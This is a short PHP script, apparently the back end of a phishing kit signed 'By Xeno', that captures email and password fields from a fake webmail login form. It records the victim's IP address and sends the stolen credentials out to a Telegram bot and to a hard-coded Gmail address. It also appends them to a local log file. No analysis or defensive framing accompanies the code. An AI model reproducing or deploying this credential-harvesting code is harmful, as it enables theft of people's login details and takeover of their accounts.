<?php
session_start();
$send = "patrickfoong28@gmail.com";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$praga=rand();
$praga=md5($praga);



function sendMessage($token, $chatid, $message) {

    $url = "https://api.telegram.org/bot/sendMessage?chat_id=&text=";
    $url .= urlencode($message);
    $ch = curl_init();
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$token = '';
$chatid = '';

$response;






$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |   \candwmail| -----------\n";
$message .= "email      :  ".$_POST['email']." \n";
$message .= "password    :  ".$_POST['password']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";

$subject = "|  \candwmail By Xeno | $ip |";
$result = json_decode(sendMessage($token, $chatid, $message));
mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);








?>


